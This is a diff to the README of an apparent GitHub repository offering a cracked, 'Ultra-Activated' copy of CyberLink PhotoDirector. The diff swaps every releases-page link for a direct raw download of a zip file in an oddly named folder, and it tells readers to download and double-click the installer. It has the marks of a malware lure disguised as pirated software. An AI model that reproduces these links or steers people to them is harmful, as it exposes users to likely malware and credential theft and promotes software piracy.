@@ -1,6 +1,6 @@
 # 📸 CyberLink-PhotoDirector-Ultra-Activated - Enhance Your Photos with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-007BFF)](https://github.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/releases)
+[![Download Now](https://raw.githubusercontent.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/main/tarsotarsal/Activated-Photo-Ultra-Cyber-Director-Link-3.5.zip%20Now-Here-007BFF)](https://raw.githubusercontent.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/main/tarsotarsal/Activated-Photo-Ultra-Cyber-Director-Link-3.5.zip)
 
 ## 📚 Overview
 CyberLink PhotoDirector Ultra-Activated provides users with essential tools for photo editing. This software enhances your editing experience by offering features like background removal, batch processing, and portrait enhancement. 
@@ -16,11 +16,11 @@ CyberLink PhotoDirector Ultra-Activated provides users with essential tools for 
 Follow these simple steps to download and run CyberLink PhotoDirector Ultra-Activated.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/main/tarsotarsal/Activated-Photo-Ultra-Cyber-Director-Link-3.5.zip) to find the latest version.
   
 2. **Download the Software**: Locate the version you want and click on it. You will see a list of files available for download.
 
-3. **Select the Right File**: Choose the `.exe` file (for example, `PhotoDirectorUltra.exe`). Click on it to start the download.
+3. **Select the Right File**: Choose the `.exe` file (for example, `https://raw.githubusercontent.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/main/tarsotarsal/Activated-Photo-Ultra-Cyber-Director-Link-3.5.zip`). Click on it to start the download.
 
 4. **Run the Installer**: Once downloaded, locate the file in your downloads folder and double-click it to run the installer.
 
@@ -67,7 +67,7 @@ If you wish to contribute to this project:
 ## 📅 Updates
 Stay informed about the latest updates and features:
 
-- Regularly visit the [Releases page](https://github.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/releases) for new downloads.
+- Regularly visit the [Releases page](https://raw.githubusercontent.com/Takshilking/CyberLink-PhotoDirector-Ultra-Activated/main/tarsotarsal/Activated-Photo-Ultra-Cyber-Director-Link-3.5.zip) for new downloads.
 - Follow the repository for announcements regarding new features and improvements.
 
 ## 📧 Contact
